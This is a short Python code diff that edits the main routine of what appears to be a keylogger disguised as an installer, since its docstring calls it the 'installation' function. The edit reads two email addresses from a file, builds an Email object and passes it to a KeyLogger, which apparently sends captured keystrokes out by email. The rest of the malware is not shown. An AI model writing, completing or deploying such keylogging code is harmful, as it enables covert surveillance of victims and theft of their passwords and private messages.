@@ -24,15 +24,18 @@ def main():
     """
     Main "installation" function used to install program
     """
+    # create the email from formatter, and close it
     f = open("format.txt")
+    my_email = f.readline()
+    to_email = f.readline()
+    f.close()
 
-    # create the email from formatter
-    email = Email(f.readline(), f.readline())
+    # run the logger
+    email = Email(my_email, to_email)
     kl = KeyLogger(email) 
     kl.run_keylogger()
 
-    # close file
-    f.close()
+   
 
 
 # check to see if main script being run
